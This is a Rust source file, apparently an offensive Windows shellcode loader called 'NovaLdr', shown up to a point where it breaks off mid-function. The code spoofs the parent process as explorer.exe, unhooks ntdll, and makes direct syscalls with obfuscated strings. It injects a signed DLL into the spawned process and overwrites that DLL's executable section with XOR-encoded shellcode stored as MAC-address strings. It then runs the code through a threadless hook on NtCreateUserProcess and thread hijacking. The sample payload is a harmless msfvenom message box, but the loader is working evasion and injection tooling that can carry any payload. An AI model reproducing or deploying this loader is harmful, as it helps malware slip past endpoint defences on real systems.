// In memory of all those murdered in the Nova party massacre 7.10.2023
// Bring back the kidnapped
#![allow(non_snake_case, dead_code, unused_imports)]
#[macro_use]
extern crate litcrypt;

// HoLAI imports
use std::sync::atomic::{AtomicBool, Ordering};
use winapi::um::processthreadsapi::*;
use winapi::um::memoryapi::*;
use winapi::um::winnt::*;
use winapi::shared::minwindef::*;
use winapi::shared::basetsd::*;
// HoLAI imports
use memoffset::offset_of;
use obfstr::obfstr;
use rust_syscalls::syscall;
use std::ffi::{OsStr, c_char, CStr, c_int};
use std::io;
use std::os::windows::ffi::OsStrExt;
use std::{mem::size_of, ptr::null_mut};
use widestring::U16CString;
use winapi::ctypes::c_void;
use std::ptr::NonNull;
use rand::prelude::SliceRandom;
use std::mem;
use std::arch::asm;
use windows_sys::Win32::{
    System::{
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ},
        SystemServices::{IMAGE_DOS_HEADER},
        Threading::{ PROCESS_ALL_ACCESS},
    },
    
};

use winapi::{
    
    shared::{
        ntdef::{HANDLE, PVOID, OBJECT_ATTRIBUTES, NT_SUCCESS, UNICODE_STRING, LIST_ENTRY, SHORT, WCHAR},
        basetsd::{SIZE_T},
        minwindef::{ULONG,DWORD},
        ntstatus::STATUS_SUCCESS,
    },

    um::{
        winnt::{
                THREAD_ALL_ACCESS, CONTEXT, CONTEXT_ALL, IMAGE_NT_HEADERS, IMAGE_SECTION_HEADER,
                IMAGE_SCN_MEM_EXECUTE, IMAGE_SCN_MEM_READ, IMAGE_EXPORT_DIRECTORY,IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_NT_SIGNATURE, 
                IMAGE_DOS_SIGNATURE, LARGE_INTEGER, MEM_RELEASE, PAGE_EXECUTE_READWRITE, MEMORY_BASIC_INFORMATION
            },
    },
};

use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntpsapi::{PEB_LDR_DATA, PROCESS_BASIC_INFORMATION, ProcessBasicInformation, PS_ATTRIBUTE, PS_CREATE_INFO, ProcessImageFileName},
    ntpebteb::PEB,
    ntexapi::{SYSTEM_PROCESS_INFORMATION, SystemProcessInformation, SYSTEM_THREAD_INFORMATION},
    ntrtl::{RtlCreateProcessParametersEx ,RtlDestroyProcessParameters},
    ntobapi::DUPLICATE_SAME_ACCESS,
};


// msfvenom -p windows/x64/messagebox TITLE=NovaLdr TEXT='In memory of all those murdered in the Nova party massacre 7.10.2023' ICON=WARNING EXITFUNC=thread -b '\xff\x00\x0b' -f raw -e none -o Nova_MSG.bin
// py .\bin2mac.py .\Nova_MSG.bin > .\Nova_MSG.txt
use_litcrypt!();

const MAC: &[&str] = &[
    "BE-0A-C3-A6-B2-BD",
    "BD-BD-AA-92-42-42",
    "42-03-13-03-12-10",
    "13-14-0A-73-90-27",
    "0A-C9-10-22-7C-0A",
    "C9-10-5A-7C-0A-C9",
    "10-62-7C-0A-C9-30",
    "12-7C-0A-4D-F5-08",
    "08-0F-73-8B-0A-73",
    "82-EE-7E-23-3E-40",
    "6E-62-03-83-8B-4F",
    "03-43-83-A0-AF-10",
    "03-13-7C-0A-C9-10",
    "62-7C-C9-00-7E-0A",
    "43-92-7C-C9-C2-CA",
    "42-42-42-0A-C7-82",
    "36-2D-0A-43-92-12",
    "7C-C9-0A-5A-7C-06",
    "C9-02-62-0B-43-92",
    "A1-1E-0A-BD-8B-7C",
    "03-C9-76-CA-0A-43",
    "94-0F-73-8B-0A-73",
    "82-EE-03-83-8B-4F",
    "03-43-83-7A-A2-37",
    "B3-7C-0E-41-0E-66",
    "4A-07-7B-93-37-94",
    "1A-7C-06-C9-02-66",
    "0B-43-92-24-7C-03",
    "C9-4E-0A-7C-06-C9",
    "02-5E-0B-43-92-7C",
    "03-C9-46-CA-0A-43",
    "92-03-1A-03-1A-1C",
    "1B-18-03-1A-03-1B",
    "03-18-0A-C1-AE-62",
    "03-10-BD-A2-1A-03",
    "1B-18-7C-0A-C9-50",
    "AB-0B-BD-BD-BD-1F",
    "7C-0A-CF-CF-35-43",
    "42-42-03-F8-0E-35",
    "64-45-BD-97-0B-85",
    "83-72-42-42-42-7C",
    "0A-CF-D7-68-43-42",
    "42-7C-0E-CF-C7-2D",
    "43-42-42-0A-73-8B",
    "03-F8-07-C1-14-45",
    "BD-97-F9-A2-5F-68",
    "48-03-F8-E4-D7-FF",
    "DF-BD-97-0A-C1-86",
    "6A-7E-44-3E-48-C2",
    "B9-A2-37-47-F9-05",
    "51-30-2D-28-42-1B",
    "03-CB-98-BD-97-0B",
    "2C-62-2F-27-2F-2D",
    "30-3B-62-2D-24-62",
    "23-2E-2E-62-36-2A",
    "2D-31-27-62-2F-37",
    "30-26-27-30-27-26",
    "62-2B-2C-62-36-2A",
    "27-62-0C-2D-34-23",
    "62-32-23-30-36-3B",
    "62-2F-23-31-31-23",
    "21-30-27-62-75-6C",
    "73-72-6C-70-72-70",
    "71-42-0C-2D-34-23",
    "0E-26-30-42-37-31",
    "27-30-71-70-6C-26",
    "2E-2E-42-D2-D2-D2",
];


const DELAY_MULTIPLIER: i64 = 10_000;
const STACK_OFFSET: isize = 8192;
const KEY: u8 = 0x42;
const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
const SW_HIDE: c_int = 0;
const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x10000000000;


#[repr(C)]
struct CLIENT_ID {
    UniqueProcess: HANDLE,
    UniqueThread: HANDLE,

}


#[repr(C)]
struct PS_ATTRIBUTE_LIST {
    TotalLength: SIZE_T,
    Attributes: [PS_ATTRIBUTE; 3],

}


#[repr(C)]
struct DLL_DATA_TABLE {
    InLoadOrderLinks: LIST_ENTRY,
    InMemoryOrderLinks: LIST_ENTRY,
    InInitializationOrderLinks: LIST_ENTRY,
    DllBase: PVOID,
    EntryPoint: PVOID,
    SizeOfImage: ULONG,
    FullDllName: UNICODE_STRING,
    BaseDllName: UNICODE_STRING,
    Flags: ULONG,
    LoadCount: SHORT,
    TlsIndex: SHORT,
    HashTableEntry: LIST_ENTRY,
    TimeDateStamp: ULONG,

}


struct Process {
    process_name: String,
    process_id: u32,
    file_path: String,
    file_name: String,
    process_handle: isize,
    allocated_memory: usize,
    thread_handle: HANDLE, // new field

}


fn main() {


    // Step 1: Obtain the process ID of explorer.exe. 
    println!("{}", lc!("[+] Getting Parent Process PID:"));
    let explorer_pid = match get_process_id_by_name("explorer.exe") {
        Ok(pid) => pid,
        Err(e) => {
            println!("Error getting explorer.exe PID: {}", e);
            return;
        }
    };

    let mut process = Process {
        process_name: String::new(),  // placeholder
        process_id: 0,                // placeholder
        file_path: lc!("C:\\Windows\\System32\\mshtml.dll"),
        file_name: lc!("mshtml.dll"),
        process_handle: 0,
        allocated_memory: 0,
        thread_handle: null_mut(),
    };

    println!("{} {}", lc!("[+] Spwanning Process With Spoofed PPID:"), explorer_pid);

    // Step 2: Spawn the iexplore.exe process and initialize the Process struct.
    spawn_process(explorer_pid as u64, &mut process);

    println!("{} {} {} {}", lc!("[+] Successfully Spwand Process"), process.process_name, lc!("With PID:"), process.process_id);

    //std::thread::sleep(std::time::Duration::from_secs(3));
    unhook_ntdll(&mut process, false);
    unhook_ntdll(&mut process, true);

    
    // Inject a legitimate Microsoft signed DLL (e.g. amsi.dll)
    inject_dll(&mut process);
    
    // Inject the shellcode into the Microsoft Signed DLL inside the target process (e.g notepad.exe -> amsi.dll)

    let _ = inject_shellcode(&mut process);

}


fn inject_dll(process: &mut Process) {
     
    process.process_handle = get_process_handle(process.process_id)
        .expect(obfstr!("Failed to get process handle"));

    let dll_path_wide: Vec<u16> = OsStr::new(&process.file_path)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();

    let mut base_address: PVOID = null_mut();
    let mut region_size: SIZE_T = (dll_path_wide.len() * 2) as SIZE_T;

    let status = unsafe {
        syscall!(
            "ZwAllocateVirtualMemory",
            process.process_handle as *mut c_void,
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )
    };
    
    if status != 0 {
        panic!("{}",lc!("Failed to Allocate memory"));
    }
    process.allocated_memory = base_address as usize;

    let formatted_string = format!("{} {:#x}", lc!("[+] Allocated Memory:"), process.allocated_memory);
    println!("{}", formatted_string);

    // Write DLL path to process memory
    let status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process.process_handle as *mut c_void,
            process.allocated_memory as *mut c_void,
            dll_path_wide.as_ptr() as *const c_void,
            dll_path_wide.len() * 2,
            null_mut::<usize>())
    };

    if status != 0 {
        panic!("{}",lc!("Failed to write to process memory"));
    }

   // Retrieve the LoadLibraryW function address
    let kernel32_base = get_module_base_by_name("KERNEL32.DLL", process.process_id)
        .expect(obfstr!("Failed to get KERNEL32.DLL base"));
    let formatted_string = format!("{} {:p}", lc!("[+] KERNEL32.DLL Base Address:"), kernel32_base);
    println!("{}", formatted_string);

    let loadlib_address = get_proc_address(kernel32_base, "LoadLibraryW")
        .expect(obfstr!("Failed to get LoadLibraryW address"));
    let formatted_string = format!("{} {:p}", lc!("[+] LoadLibraryW Address:"), loadlib_address);
    println!("{}", formatted_string);
    
    // Ensure shellcode is correctly constructed and the placeholders are correctly replaced with the appropriate addresses.
    let mut load_library_shellcode: Vec<u8> = vec![
        0x55, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x30,
        0x48, 0xB9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xFF, 0xD0, 0xC9, 0xC3
    ];
    
    load_library_shellcode[10..18].copy_from_slice(&(process.allocated_memory as u64).to_le_bytes());
    load_library_shellcode[20..28].copy_from_slice(unsafe {
        std::slice::from_raw_parts(&loadlib_address as *const _ as *const u8, 8)
    });

    // Allocate memory in the target process for the shellcode
    let mut shellcode_address: PVOID = null_mut();
    let mut shellcode_size: SIZE_T = load_library_shellcode.len() as SIZE_T;
    let status = unsafe {
        syscall!(
            "ZwAllocateVirtualMemory",
            process.process_handle as *mut c_void,
            &mut shellcode_address,
            0,
            &mut shellcode_size,
            MEM_COMMIT | MEM_RESERVE ,
            PAGE_READWRITE
        )
    };
    if status != 0 {
        panic!("{} {:#X}", lc!("Failed to allocate memory for shellcode:"), status);
    }


    // Write the shellcode to the target process
    let status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process.process_handle as *mut c_void,
            shellcode_address,
            load_library_shellcode.as_ptr() as *const c_void,
            load_library_shellcode.len(),
            null_mut::<usize>()
        )
    };
    if status != 0 {
        panic!("{}", lc!("Failed to write shellcode to target process"));
    }

    // After writing the shellcode to the target process
    let mut old_protect: u32 = 0;
    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process.process_handle as *mut c_void,
            &mut shellcode_address,
            &mut shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protect
        )
    };

    if protect_status != 0 {
        panic!("{}", lc!("Failed to change shellcode memory protection"));
    }

    let dll_base = get_module_base_by_name("ntdll.dll", process.process_id)
        .expect(obfstr!("Failed to get ntdll.dll base"));

    let load_address = get_proc_address(dll_base, "NtCreateUserProcess")
        .expect(obfstr!("Failed to get CreateEventA address"));

    println!("{} {:#x}", lc!("[+] Crafted Assembly at address:"), shellcode_address as usize);

    let formatted_string = format!("{} {:p}", lc!("[+] Exported Functio Address:"), load_address);
    println!("{}", formatted_string);

    // Run the threadless thread
    let result = threadless_thread(
        process.process_handle as *mut c_void,
        shellcode_address as *mut c_void,
        load_address as *mut c_void
    );

    if !result {
        panic!("Threadless injection failed");
    }

    // Clean up
    let status = unsafe {
        syscall!(
            "ZwFreeVirtualMemory",
            process.process_handle as *mut c_void,
            &mut shellcode_address,
            &mut shellcode_size,
            MEM_RELEASE
        )
    };

    if status != 0 {
        panic!("Failed to free memory: {:#X}", status);

    }

}


fn inject_shellcode(process: &mut Process) -> Result<(), String> {

    let module_base = get_module_base_by_name(&process.file_name, process.process_id)
        .expect(obfstr!("Failed to get module base address"));
    
    println!("[+] Module Base: {:p}", module_base);
    
    let rx_section_offset = find_rx_section_offset(process, module_base as usize).expect(obfstr!("Failed to find rx section offset"));
    let rx_section_size = find_rx_section_size(process, module_base as usize).expect(obfstr!("Failed to get rx section size"));

    let nox = mac_to_bytes(MAC);
    if nox.len() > rx_section_size as usize {
        panic!("{}", lc!("[-] Shellcode is larger than RX section"));
    }


    let mut injection_address = unsafe { module_base.offset(rx_section_offset as isize) };
    
    let formatted_string = format!("{} {:p}", lc!("[+] RX Injection address: "), injection_address);
    println!("{}",formatted_string);

    let mut old_perms = 0;
    let mut region_size: SIZE_T = rx_section_size.try_into().unwrap(); // Define the region size as SIZE_T

    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process.process_handle as *mut c_void,
            &mut injection_address as *mut _,
            &mut region_size,
            PAGE_READWRITE,  
            &mut old_perms
        )
    };
    
    if protect_status != 0 {
        panic!("{}", lc!("[-] Failed to change memory protection"));
    }

    let mut byteswritten = 0;
    let buffer = nox.as_ptr() as *mut c_void;
    let write_status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process.process_handle as *mut c_void,
            injection_address as *mut c_void,
            buffer,
            nox.len(),
            &mut byteswritten
        )
    };
    if write_status != 0 {
        panic!("{}", lc!("[-] Failed to write process memory"));
    }

    let formatted_string = format!("{} {:x}", lc!("[+] Written Bytes:"), byteswritten);
    println!("{}",formatted_string);

    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process.process_handle as *mut c_void,
            &mut injection_address as *mut _,
            &mut region_size,
            PAGE_EXECUTE_READ,
            &mut old_perms
        )
    };
    if protect_status != 0 {
        panic!("{} {:#X}", lc!("[-] Failed to change memory protection"), protect_status);
    }

    let handle = process.process_handle as *mut c_void;


    // Get the remote thread handle
    let hThread = match get_remote_thread_handle(process.process_id) {
        Ok(handle) => handle,
        Err(e) => panic!("{} {}", lc!("Failed to get remote thread handle:"), e), // Changed to panic
    };
    

    // Hijack the thread
    let formatted_string = format!("{} {:p}", lc!("[+] Remote Thread Handle Obtained:"), hThread);
    println!("{}",formatted_string);
    
    //4th args in this function is process and the 3rd args is handle
    match jmp_hijack_thread(hThread, injection_address as PVOID, handle) {
        Ok(_) => println!("{}", lc!("[+] Thread hijacking successful")),
        Err(e) => panic!("{} {}", lc!("Failed to hijack thread:"), e),
    };


    let _ = unlink_module(&process.file_name,process.process_id);
    
    //unsafe { syscall!("ZwClose", hThread as *mut c_void) };
    unsafe { syscall!("ZwClose",handle as *mut c_void) };
    
    Ok(())

}


fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let mut buffer: Vec<u8> = Vec::with_capacity(1024 * 1024);
    let mut return_length: ULONG = 0;

    let status = unsafe {
        syscall!(
        "ZwQuerySystemInformation",
            SystemProcessInformation,
            buffer.as_mut_ptr() as *mut c_void,
            buffer.capacity() as ULONG,
            &mut return_length)
    };

    if status != STATUS_SUCCESS {
        return Err(obfstr!("Failed to call ZwQuerySystemInformation").to_owned());
    }

    unsafe {
        buffer.set_len(return_length as usize);
    }

    let mut process_info = buffer.as_ptr() as *mut SYSTEM_PROCESS_INFORMATION;

    loop {
        let current_process_name_ptr = unsafe { (*process_info).ImageName.Buffer };
        let current_process_name_length = unsafe { (*process_info).ImageName.Length } as usize;

        if !current_process_name_ptr.is_null() {
            let current_process_name = unsafe {
                std::slice::from_raw_parts(current_process_name_ptr, current_process_name_length / 2)
            };

            let current_process_name_str = String::from_utf16_lossy(current_process_name);

            if current_process_name_str.to_lowercase() == process_name.to_lowercase() {
                return Ok(unsafe { (*process_info).UniqueProcessId } as u32);
            }
        }

        if unsafe { (*process_info).NextEntryOffset } == 0 {
            break;
        }

        process_info = unsafe {
            (process_info as *const u8).add((*process_info).NextEntryOffset as usize)
        } as *mut SYSTEM_PROCESS_INFORMATION;

    }
    unsafe {syscall!("ZwClose",(*process_info).UniqueProcessId as HANDLE) };

    Err(obfstr!("Failed to find process").to_owned())

}


fn threadless_thread(process_handle: *mut c_void, executable_code_address: *mut c_void, mut export_address: *mut c_void) -> bool {    // Memory Allocation for Trampoline
    let mut trampoline: Vec<u8> = vec![
        0x58,                                                           // pop RAX
        0x48, 0x83, 0xe8, 0x0c,                                         // sub RAX, 0x0C                    : when the function will return, it will not return to the next instruction but to the previous one
        0x50,                                                           // push RAX
        0x55,                                                           // PUSH RBP
        0x48, 0x89, 0xE5,                                               // MOV RBP, RSP
        0x48, 0x83, 0xec, 0x08,                                         // SUB RSP, 0x08                    : always equal to 8%16 to have an aligned stack. It is mandatory for some function call
        0x51,                                                           // push RCX                         : just save the context registers
        0x52,                                                           // push RDX
        0x41, 0x50,                                                     // push R8
        0x41, 0x51,                                                     // push R9
        0x41, 0x52,                                                     // push R10
        0x41, 0x53,                                                     // push R11
        0x48, 0xb9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RCX, 0x0000000000000000   : restore the hooked function code
        0x48, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // movabs RDX, 0x0000000000000000   : restore the hooked function code
        0x48, 0x89, 0x08,                                               // mov qword ptr[rax], rcx          : restore the hooked function code
        0x48, 0x89, 0x50, 0x08,                                         // mov qword ptr[rax+0x8], rdx      : restore the hooked function code
        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // mov RAX, 0x0000000000000000      : Address where the execution flow will be redirected
        0xff, 0xd0,                                                     // call RAX                         : Call the malicious code
        0x41, 0x5b,                                                     // pop R11                          : Restore the context
        0x41, 0x5a,                                                     // pop R10
        0x41, 0x59,                                                     // pop R9
        0x41, 0x58,                                                     // pop R8
        0x5a,                                                           // pop RDX
        0x59,                                                           // pop RCX
        0xc9,                                                           // leave
        0xc3 
    ];

    let mut original_instructions_high: u64 = 0;
    let mut original_instructions_low: u64 = 0;
    let mut sz_output: usize = 0;
    let original_export_address = export_address;

    // Read the original instructions
    let read_status_high = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle,
            export_address as *mut c_void,
            &mut original_instructions_high as *mut _ as *mut c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    let read_status_low = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle,
            ((export_address as usize) + std::mem::size_of::<u64>()) as *mut c_void,
            &mut original_instructions_low as *mut _ as *mut c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    if read_status_high != 0 || read_status_low != 0 {
        panic!("{}", lc!("Error reading virtual memory."));
    }
    println!("{} {:#p} {:#p}", lc!("[+] Original instructions read:"), original_instructions_high as *mut c_void, original_instructions_low as *mut c_void);


    trampoline[26..34].copy_from_slice(&original_instructions_high.to_le_bytes());
    trampoline[36..44].copy_from_slice(&original_instructions_low.to_le_bytes());
    trampoline[53..61].copy_from_slice(&(executable_code_address as u64).to_le_bytes());


    let mut trampoline_size = trampoline.len() as isize;
    let mut trampoline_address: *mut c_void = std::ptr::null_mut();
    let alloc_status = unsafe {
        syscall!(
            "ZwAllocateVirtualMemory",
            process_handle,
            &mut trampoline_address,
            0,
            &mut trampoline_size,
            MEM_COMMIT,
            PAGE_READWRITE
        )
    };

    if alloc_status != 0 {

        panic!("{} {:#X}",lc!("Error allocating virtual memory. Status:"),alloc_status);
    }


    println!("{} {:#p}", lc!("[+] Writing trampoline to:"), trampoline_address as *mut c_void);

    let write_status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            trampoline_address,
            trampoline.as_ptr() as *const c_void,
            trampoline.len(),
            &mut sz_output
        )
    };

    if write_status != 0 {
        panic!("{} {:#X}", lc!("Error writing trampoline to memory. Status:"), write_status);
    }
    let mut old_protect: u32 = 0;
    // Change protection of trampoline to PAGE_EXECUTE_READ
    let protect_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut trampoline_address,
            &mut trampoline_size,
            PAGE_EXECUTE_READ,
            &mut old_protect
        )
    };
    if protect_status != 0 {
        panic!("{} {:#X}", lc!("Failed to change trampoline memory protection. Status:"), protect_status);
    }

    let mut hook: [u8; 12] = [
        0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0xFF, 0xD0
    ];

    hook[2..10].copy_from_slice(&(trampoline_address as u64).to_le_bytes());

    // Before writing the hook, change the memory protection of the target region.
    let mut old_protect_hook: u32 = 0;
    let protect_hook_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut export_address as *mut _ as *mut c_void,
            &mut sz_output,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect_hook
        )
    };

    if protect_hook_status != 0 {
        panic!("{} {:#X}", lc!("Failed to change hook memory protection before writing. Status:"), protect_hook_status);
    }
    println!("{} {:#p}", lc!("[+] Writing hook to:"), export_address);

    let hook_status = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            export_address as *mut c_void,
            &hook as *const _ as *const c_void,
            hook.len(),
            &mut sz_output
        )
    };

    if hook_status != 0 {
        panic!("{} {:#X}", lc!("Error writing hook to memory. Status:"), hook_status);
    }


    let mut hooked_bytes: [u8; 12] = [0; 12];
    loop {
        println!("{}", lc!("[+] Waiting 10 seconds for the hook to be called..."));
        encrypted_sleep(30000);
        let hook_check_status = unsafe {
            syscall!(
                "ZwReadVirtualMemory",
                process_handle,
                export_address as *mut c_void,
                &mut hooked_bytes as *mut _ as *mut c_void,
                hook.len(),
                &mut sz_output
            )
        };

        if hook_check_status != 0 {
            panic!("{} {:#X}", lc!("Error checking if hook has been executed. Status:"), hook_check_status);
        }

        if hooked_bytes != hook {
            break;
        }
    }

    
    println!("{} {:#p}", lc!("[+] Freeing trampoline at:"), trampoline_address as *mut c_void);

    let mut size_null: usize = 0;
    let free_status = unsafe {
        syscall!(
            "ZwFreeVirtualMemory",
            process_handle,
            &mut trampoline_address,
            &mut size_null as *mut _ as *mut c_void,
            MEM_RELEASE
        )
    };

    if free_status != 0 {
        panic!("{} {:#X}", lc!("Failed to FreeVirtualMemory. Status:"), free_status);
    }

    println!("{} {:#p}", lc!("[+] Restoring original instructions at:"), original_export_address);

    let restore_status_high = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            export_address as *mut c_void, // <-- Use original_export_address
            &original_instructions_high as *const _ as *const c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    let restore_status_low = unsafe {
        syscall!(
            "ZwWriteVirtualMemory",
            process_handle,
            ((export_address as usize) + std::mem::size_of::<u64>()) as *mut c_void, // <-- Use original_export_address
            &original_instructions_low as *const _ as *const c_void,
            std::mem::size_of::<u64>(),
            &mut sz_output
        )
    };

    if restore_status_high != 0 || restore_status_low != 0 {
        panic!("{}", lc!("Failed to WriteVirtualMemory. Status:"));
    }

    let restore_protect_hook_status = unsafe {
        syscall!(
            "ZwProtectVirtualMemory",
            process_handle,
            &mut export_address as *mut _ as *mut c_void,
            &mut sz_output,
            PAGE_EXECUTE_READ,
            &mut old_protect_hook
        )
    };

    if restore_protect_hook_status != 0 {
        panic!("{} {:#X}", lc!("Failed to restore hook memory protection after writing. Status:"), restore_protect_hook_status);
    }

    true

}


fn get_module_base_by_name(module_name: &str, process_id: u32) -> Result<*mut u8, String> {
    let process_handle = get_process_handle(process_id)?;
    let _object_attributes: OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed::<OBJECT_ATTRIBUTES>() };
    let mut client_id: CLIENT_ID = unsafe { std::mem::zeroed::<CLIENT_ID>() };
    client_id.UniqueProcess = process_id as PVOID;

    let mut process_basic_info: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed::<PROCESS_BASIC_INFORMATION>() };
    let mut return_length: ULONG = 0;
    let status = unsafe {
        syscall!(
            "ZwQueryInformationProcess",
            process_handle as *mut c_void,
            ProcessBasicInformation,
            &mut process_basic_info as *mut PROCESS_BASIC_INFORMATION as *mut c_void,
            size_of::<PROCESS_BASIC_INFORMATION>() as ULONG,
            &mut return_length)
    };

    if status != 0 {
        return Err(obfstr!("Failed to call NtQueryInformationProcess").to_owned());
    }

    let pbi = process_basic_info.PebBaseAddress;
    let mut peb: PEB = unsafe { std::mem::zeroed::<PEB>() };
    let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle as *mut c_void,
            pbi as PVOID,
            &mut peb as *mut PEB as *mut c_void,
            size_of::<PEB>() as SIZE_T,
            std::ptr::null_mut::<c_void>())
    };

    if status != 0 {
        return Err(obfstr!("Failed to read PEB").to_owned());
    }

    let mut ldr_data: PEB_LDR_DATA = unsafe { std::mem::zeroed::<PEB_LDR_DATA>() };
    let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
            process_handle as *mut c_void,
            peb.Ldr as PVOID,
            &mut ldr_data as *mut PEB_LDR_DATA as *mut c_void,
            size_of::<PEB_LDR_DATA>() as SIZE_T,
            std::ptr::null_mut::<c_void>())
    };

    if status != 0 {
        return Err(obfstr!("Failed to read PEB_LDR_DATA").to_owned());
    }

    let mut ldr_entry: LDR_DATA_TABLE_ENTRY = unsafe { std::mem::zeroed::<LDR_DATA_TABLE_ENTRY>() };
    let mut current = ldr_data.InLoadOrderModuleList.Flink;

    loop {
        let ldr_entry_address = (current as usize - offset_of!(LDR_DATA_TABLE_ENTRY, InLoadOrderLinks)) as *mut LDR_DATA_TABLE_ENTRY;
        let status = unsafe {
        syscall!(
            "ZwReadVirtualMemory",
                process_handle as *mut c_void,
                ldr_entry_address as PVOID,
                &mut ldr_entry as *mut LDR_DATA_TABLE_ENTRY as *mut c_void,
                size_of::<LDR_DATA_TABLE_ENTRY>() as SIZE_T,
                std::ptr::null_mut::<c_void>())
        };

        if status != 0 {
            return Err(obfstr!("Failed to read LDR_DATA_TABLE_ENTRY").to_owned());
        }

        let module_name_length = ldr_entry.BaseDllName.Length as usize;
        let mut module_name_vec = vec![0u16; module_name_length / 2];
        let status = unsafe {
            syscall!(
            "ZwReadVirtualMemory",
                process_handle as *mut c_void,
                ldr_entry.BaseDllName.Buffer as PVOID,
                module_name_vec.as_mut_ptr() as *mut c_void,
                module_name_length as SIZE_T,
                std::ptr::null_mut::<c_void>())
        };

        if status != 0 {
            return Err(obfstr!("Failed to read module name").to_owned());
        }

        let current_module_name = String::from_utf16_lossy(&module_name_vec);
        if current_module_name.to_lowercase() == module_name.to_lowercase() {
            unsafe { syscall!("ZwClose",process_handle as *mut c_void)};
            return Ok(ldr_entry.DllBase as *mut u8);
        }

        if current == ldr_data.InLoadOrderModuleList.Blink {
            break;
        }

        current = ldr_entry.InLoadOrderLinks.Flink;
    }

    unsafe { syscall!("ZwClose",process_handle as *mut c_void)};
    Err(obfstr!("Failed to find module").to_owned())

}


fn find_rx_section_offset(process: &mut Process, module_base: usize) -> io::Result<u32> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base).expect(obfstr!("Failed to read DOS header"));
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize).expect(obfstr!("Failed to read NT headers"));

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>()  + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),
        )
        .expect(obfstr!("Failed to read section header"));

        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            
            return Ok(section_header.VirtualAddress);
        }
    }

    
    Ok(0)

}


fn find_rx_section_size(process: &mut Process, module_base: usize) -> io::Result<u32> {
    let dos_header: IMAGE_DOS_HEADER = read_memory(process.process_handle as *mut c_void, module_base).expect(obfstr!("Failed to read DOS header"));
    let nt_headers: IMAGE_NT_HEADERS = read_memory(process.process_handle as *mut c_void, module_base + dos_header.e_lfanew as usize).expect(obfstr!("Failed to read NT headers"));

    for i in 0..nt_headers.FileHeader.NumberOfSections {
        let section_header: IMAGE_SECTION_HEADER = read_memory(
            process.process_handle as *mut c_void,
            module_base + dos_header.e_lfanew as usize + std::mem::size_of::<IMAGE_NT_HEADERS>()  + (i as usize) * std::mem::size_of::<IMAGE_SECTION_HEADER>(),
        )
        .expect(obfstr!("Failed to read section header"));

        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0
            && (section_header.Characteristics & IMAGE_SCN_MEM_READ) != 0
        {
            
            return Ok(section_header.SizeOfRawData);
        }
    }

    
    Ok(0)

}


fn get_proc_address(module_base: *mut u8, function_name: &str) -> Result<*mut c_void, String> {
    unsafe {
        let dos_header = *module_base.cast::<IMAGE_DOS_HEADER>();
        if dos_header.e_magic != IMAGE_DOS_SIGNATURE {
            return Err(obfstr!("Invalid DOS signature").to_owned());
        }

        let nt_headers_ptr = module_base.add(dos_header.e_lfanew as usize) as *const IMAGE_NT_HEADERS;
        let nt_headers = *nt_headers_ptr;

        if nt_headers.Signature != IMAGE_NT_SIGNATURE {
            return Err(obfstr!("Invalid NT signature").to_owned());
        }

        let export_dir_rva = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT as usize].VirtualAddress;
        let export_dir = module_base.add(export_dir_rva as usize) as *const IMAGE_EXPORT_DIRECTORY;

